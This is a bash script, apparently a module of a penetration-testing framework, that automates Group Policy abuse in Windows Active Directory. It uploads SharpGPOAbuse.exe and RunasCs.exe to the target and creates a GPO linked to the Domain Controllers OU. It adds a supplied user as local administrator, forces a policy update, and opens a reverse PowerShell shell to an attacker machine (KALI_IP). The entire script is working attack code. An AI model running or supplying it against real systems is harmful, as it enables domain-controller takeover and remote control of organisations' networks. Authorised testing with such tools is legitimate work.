#!/bin/bash

: '
ps: do a GPO abuse
'

LOCATION="${SCRIPTS_DIR}/reconnaissance/windows/activeDirectroy/sharpGPOAbuse/.files"
FILE="SharpGPOAbuse.exe"

ps_webclient_upload_file "${LOCATION}" "${FILE}"
SHARP_GPO_ABUSE_FILE_LOCATION="${FILE_LOCATION}"

FILE="RunasCs.exe"
ps_webclient_upload_file "${LOCATION}" "${FILE}"
RUN_AS_FILE_LOCATION="${FILE_LOCATION}"

# Generate GUI form items (label, type (optional: default text), name, default (optional))
DOMAIN_FIELD=$(form_item  "domain" "domain")
USERNAME_FIELD=$(form_item  "username" "username")
PASSWORD_FIELD=$(form_item  "password" "password")
SHELL_PORT_FIELD=$(form_item  "Shell port" "shell_port")
DC_FIELD=$(form_item  "DC" "dc")

# Generate GUI form
generate_form "${DOMAIN_FIELD}" "${USERNAME_FIELD}" "${PASSWORD_FIELD}" "${SHELL_PORT_FIELD}"

DOMAIN=${form_data["domain"]}
USERNAME=${form_data["username"]}
PASSWORD=${form_data["password"]}
SHELL_PORT=${form_data["shell_port"]}
DC=${form_data["dc"]}

GPO_NAME="doesnotmatter"

execute_command "New-GPO -Name \"${GPO_NAME}\""
create_new_line
sleep 1

execute_command "New-GPLink -Name \"${GPO_NAME}\" -Target \"OU=Domain Controllers,DC=${DC}\""
create_new_line
sleep 1

execute_command "${SHARP_GPO_ABUSE_FILE_LOCATION} --AddLocalAdmin --UserAccount ${USERNAME} --GPOName ${GPO_NAME}"
create_new_line
sleep 3

execute_command "gpupdate /force"
create_new_line
sleep 2

execute_command "${RUN_AS_FILE_LOCATION} "${USERNAME}" '${PASSWORD}' powershell.exe -r ${KALI_IP}:${SHELL_PORT}"
create_new_line
